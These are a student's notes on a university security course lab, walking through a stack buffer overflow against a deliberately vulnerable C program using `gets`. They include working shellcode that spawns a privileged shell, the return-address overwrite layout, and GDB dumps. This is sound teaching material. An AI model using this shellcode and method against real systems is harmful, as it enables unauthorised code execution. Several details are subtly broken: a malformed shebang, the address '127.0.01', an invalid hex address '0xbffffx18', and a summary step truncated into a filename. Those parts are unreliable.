---
title: "CS 161 - Project 1: Exploiting Memory Safety Vulnerabilities"
---

Project spec: [Project 1: Exploiting Memory Safety Vulnerabilities](https://su24.cs161.org/proj1/)

References:
1. [[memory_safety_vulnerabilities|Memory Safety Vulnerabilities]]

In this project, you will be exploiting a series of vulnerable programs on a virtual machine. 

## Getting Started
Two options to set up the vulnerable server for the project. 

### Local Setup
The vulnerable server will be run as a virtual machine on local device, and you can acecss the machine via SSH. 

MacOS and Linux Installation (QEMU):
  - `brew install qemu`
  - Download the QEMU VM image `pwnable-su24.qcow2`
  - cd to the folder containing the downloaded image and run the following command in your terminal:
`$ qemu-system-x86_64 -accel kvm -accel hvf -accel tcg -m 512M -drive if=virtio,format=qcow2,file=pwnable-su24.qcow2 -nic user,model=virtio,hostfwd=tcp:127.0.0.1:16122-:22,hostfwd=tcp:127.0.0.1:16161-:16161`    
  - Staff does **not** recommend interacting with the VM using the virtual terminal because it doesn't support features such as copy-paste and mouse interaction. 
  - If there are QEMU issues, try locating your error in the [VM Debugging Page](https://su24.cs161.org/proj1/vm-debugging).

> [!NOTE]
>  You may safely ignore any messages of the form qemu-system-x86_64: -accel XXX: invalid accelerator XXX, qemu-system-x86_64: falling back to XXX, or qemu-system-x86_64: warning: host doesn't support requested feature: XXX. As long as the virtual machine is started (the terminal appears, and the QEMU command doesnâ€™t immediately exit), you should be fine. 

### Accessing the Machine
You will access the machine via SSH. Each question (and customization step) will provide a `USERNAME` for accessing the machine. 
`$ ssh -p 16122 USERNAME@127.0.01`
This will prompt you for a password to the vulnerable server. 

## Question 1: Remus (Launched 1975)

### Starter Files
Use the `ls -al` command to see the files for this user. Each user (one per question) will have the following files. 
- Source code for vulnerable C program, ending in `.c`. In this case, it is the `orbit.c` file.
- A vulnerable C program (name of the source file without the `.c`). In this question, this is the `orbit` file.
- `exploit`: A scaffolding script taking the malicious input and feeding it into the vulnerable program. 
- `debug-exploit`: A debugging version of the scaffolding script taking the malicious input and starting GDB. 
- `README`: File you want to read.

### Preliminaries
The task is to read the `README` file for each user. 

Each user also has a vulnerable C program which has permission to read the `README` file. If you exploit the C program, you can take over the program and force it to execute code which will read the `README` file using its elevated privileges. 

Goal for each question is to write this exploit as a malicious input to vulnerable C program in order to access the restricted `README` file. That file will contain the username and password for the next question. 

### Writing the Exploit
open `orbit.c` and take a look at the source code. Can use `cat orbit.c` or open the file in a terminal text editor. 

This question uses the vulnerable `gets` function!

Quickly verify the existence of a memory safety vulnerability. Since we want to make sure that the addresses are consistent, you should run the program using `./exploit` instead. Run the program and try typing `AAAAAAAAAAAAAAAA` followed by the Enter key. The program will segfault!

If you provide a specially crafted input to the `orbit` program, you can cause it to execute your own, malicious code, called shellcode. Write our input using Python 3, stored in an `egg` file.

Whatever bytes are printed from the `egg` file will be sent as input to the vulnerable program. At the top of all of our files is a [shebang line](https://en.wikipedia.org/wiki/Shebang_(Unix)). This tells the operating system that this executable should be run as a Python file:
`#1/usr/bin/env python3`

Since Python 3 prints all strings as UTF-8 encoding, the python text string `'\x80'` is not necessarily printed as the code `0x80` but instead as the byte sequence `0xc2 0x80`. To avoid this problem, the next line changed Python's text encoding to `latin1`, which encodes any text character in the range `'\x00'` - `'\xff'` as the raw byte `0x00` - `0xff`,  so that text strings function as byte strings as shown in lecture. 

```python
import sys

sys.stdout.reconfigure(encoding='latin1')

```

Your shellcode for this question will cause the vulnerable program to spawn a shell that you can directly interact with. The shellcode is provided in Python 3 syntax below:

```python
SHELLCODE = \
    '\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a' \
    '\x47\x58\xcd\x80\x31\xc0\x50\x68\x2d\x69' \
    '\x69\x69\x89\xe2\x50\x68\x2b\x6d\x6d\x6d' \
    '\x89\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f' \
    '\x62\x69\x6e\x89\xe3\x50\x52\x51\x53\x89' \
    '\xe1\x31\xd2\xb0\x0b\xcd\x80'


```

In this syntax, note that a function address like `0xffabcd09` becomes `'\x09\xcd\xab\xff'`. The order of the bytes is reversed since we work in a little-endian system.

In this question, you will be modifying the egg file. We have provided `vim` and `nano` in the virtual machine. Here's a [vim cheatsheet](https://vim.rtorr.com/) for your convenience.

The script will be treated as a standard Python file. You will want to include the `SHELLCODE` we have provided above, and your input will be whatever is printed from Python. 

### Running GDB
To find the addresses you need to exploit this program, you will need to tryn running the vulnerable program under GDB. Normally you would use `gdb orbit` in order to run the program. 

**However**, to make sure the GDB addresses match the addresses you get from running the program normally, we will use `./debug-exploit` instead. This will give you a GDB terminal for you to find addresses and debug the logic of the program. 

### Running Your Exploit
The `exploit` wrapper script we have provided will automatically feed the output from the `egg` script into the input of the vulnerable program. If you're curious, you can use the `cat exploit` to see how we achieve this. To run it, use `./exploit`. 

If your `egg` file is correct, the vulnerable program will launch a shell, and typing `cat README` (followed by a newline) after running `./exploit` should print the contents of `README`!

### Debugging Your Exploit
If your exploit doesn't work, you can use GDB to see how the program functions while receiving the input from your `egg`. The `debug-exploit` wrapper script will automatically run GDB, with the program receiving the output from your `egg` as input. To run it, use `./debug-exploit`

From here, use gdb as you normally would, and any calls for input will come from your exploit scripts. 

> [!NOTE]
> Recall that x86 is little-endian, so the first four bytes of the shellcode will appear as `0xcd58326a` in the debugger. To write `0x12345678` to memory, use `'\x78\x56\x34\x12'`.

### Write-up
Each question (except for this one) will require a write-up. Each question's write-up should contain the following pieces of information:
  - A description of the vulnerability
  - How any relevant "magic numbers" were determined, usually within GDB
  - A description of your exploit structure
  - GDB output demonstrating the before/after of the exploit working

### Summary
We recommend the following steps (as described above) for every quetion of this project. 
1. Look at the source code of the vulnerable program and try to find a vulnerability. 
2. Run the program with `./exploit` to make sure you understand what the program is really doing. 
3. Run the program in GDB with `./debug-exploit` and find any magic values or addresses you need.
4. Write your exploit scripts for the question
5. Test your malicious scripts with `./exploit`. Some questions (including this one) spawn a shell, so try typing `cat README`  followed by a newline.
6. If it doesn't work, use `./cs161_proj1_exploiting_memory_safety_vulnerabilities.md

To help you out, we have provided an [https://su24.cs161.org/proj1/q1#example-write-up](https://su24.cs161.org/proj1/q1#example-write-up) for this question only. You will need to submit your own write-ups for the rest of the questions. 

With the help of the example write-up, write out the input that will cause `orbit` to spawn a shell. A video demo is also available at [this link](https://www.youtube.com/watch?v=psxuAU9PycE). 

### Deliverables
- A script `egg`

### Example Write-Up
#### Main Idea
The code is vulnerable because `gets(buf)` does not check the length of the input from the user, which lets an attacker write past the end of the buffer. We insert the shellcode above the saved return address on the stack (rip) and overwrite the rip with the address of the shellcode. 

#### Magic Number
We first determined the address of the buffer (`0xbffffx18`) and the address of the rip of the `orbit` function (`0xbffffc2c`). This was done by invoking GDB and setting a breakpoint at line 5. 

```bash
(gdb) x/16x buf

0xbffffc18:  0x41414141  0xb7e5f200  0xb7fed270  0x00000000
0xbffffc28:  0xbffffc18  0x0804842a  0x08048440  0x00000000
0xbffffc38:  0x00000000  0xb7e454d3  0x00000001  0xbffffcb4
0xbffffc48:  0xbffffcbc  0xb7fdc858  0x00000000  0xbffffc1c

(gdb) i f Stack frame at 0xbffffc10:
 eip = 0x804841d in orbit (orbit.c:8); saved eip 0x804842a
 called by frame at 0xbffffc40
 source language c.
 Arglist at 0xbffffc28, args:
 Locals at 0xbffffc28, Previous frame's sp is 0xbffffc30
 Saved registers:
  ebp at 0xbffffc28, eip at 0xbffffc2c
```

By doing so, we learned that the location of the return address from this function was 20 bytes away from the start of the buffer (`0xbffffc2c` - `0xbffffx18` = 20). 

#### Exploit Structure
Here is the stack diagram (You don't need a stack diagram in your writeup).

rip(`0xbffffc2c`)
sfp
compiler padding
buf(`0xbffffc18`)

The exploit has three parts:
  1. Write 20 dummy characters to overwrite `buf`, the compiler padding, and the sfp
  2. Overwrite the rip with the address of the shellcode. Since we are putting shellcode directly after the rip, we overwrite the rip with `0xbffffc30` (`0xbffffc2c` + 4). 
  3. Finally, insert the shellcode directly after the rip.

This causes the `orbit` function to start executing the shellcode at address `0xbffffc30` when it returns. 

#### Exploit GDB Output 
When we ran GDB after inputting the malicious exploit string, we got the following output:

```bash
(gdb) x/16x buf
0xbffffc18:  0x61616161  0x61616161  0x61616161  0x61616161
0xbffffc28:  0x61616161  0xbffffc30  0xcd58326a 0x89c38980
0xbffffc38:  0x58476ac1  0xc03180cd  0x2f2f6850  0x2f686873
0xbffffc48:  0x546e6962  0x8953505b  0xb0d231e1  0x0080cd0b
```

After 20 bytes of garbage, the rip is overwritten with `0xbffffc30`, which points to the shellcode directly after the rip. 














